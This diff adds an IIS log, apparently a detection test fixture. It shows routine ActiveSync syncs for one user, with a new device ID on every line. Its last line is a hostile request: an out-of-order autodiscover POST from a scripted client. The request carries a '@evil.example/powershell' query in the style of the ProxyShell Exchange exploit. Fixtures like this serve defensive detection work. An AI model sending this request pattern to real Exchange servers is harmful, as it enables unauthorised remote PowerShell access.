@@ -1,0 +1,35 @@
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-03-16 00:00:00
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2026-03-16 00:06:19 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC575&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 826
+2026-03-16 00:48:30 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC978&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 603
+2026-03-16 01:45:36 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC692&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 631
+2026-03-16 02:25:37 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC640&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 391
+2026-03-16 03:21:12 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC930&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 144
+2026-03-16 04:07:14 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC475&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 432
+2026-03-16 04:53:00 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC865&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 629
+2026-03-16 05:36:46 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC871&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 174
+2026-03-16 06:33:30 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC548&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 356
+2026-03-16 07:20:45 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC233&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 713
+2026-03-16 08:10:48 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC317&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 567
+2026-03-16 08:53:40 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC841&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 521
+2026-03-16 09:45:31 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC228&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 783
+2026-03-16 10:28:07 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC759&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 80
+2026-03-16 11:16:52 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC162&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 769
+2026-03-16 12:10:13 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC627&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 240
+2026-03-16 12:54:30 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC601&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 597
+2026-03-16 13:36:06 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC469&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 546
+2026-03-16 14:24:54 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC516&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 620
+2026-03-16 15:21:12 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC325&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 457
+2026-03-16 16:03:29 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC163&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 484
+2026-03-16 16:58:50 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC310&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 355
+2026-03-16 17:45:30 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC364&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 134
+2026-03-16 18:30:40 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC827&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 282
+2026-03-16 19:19:02 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC165&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 150
+2026-03-16 20:07:44 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC691&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 720
+2026-03-16 20:51:36 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC944&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 825
+2026-03-16 21:37:38 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC268&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 551
+2026-03-16 22:25:38 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC901&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 756
+2026-03-16 23:12:17 192.0.2.11 POST /Microsoft-Server-ActiveSync/Proxy/default.eas Cmd=Sync&User=CORP%5Calice&DeviceId=ABC456&DeviceType=iPhone 444 CORP\alice 192.0.2.11 Apple-iPhone15C2/2104.120 - 200 0 0 357
+2026-03-16 03:00:00 192.0.2.11 POST /autodiscover/autodiscover.json @evil.example/powershell/?X-Rps-CAT=VgEAVAdXaW5kb3dz 444 - 203.0.113.77 python-requests/2.31.0 - 200 0 0 210
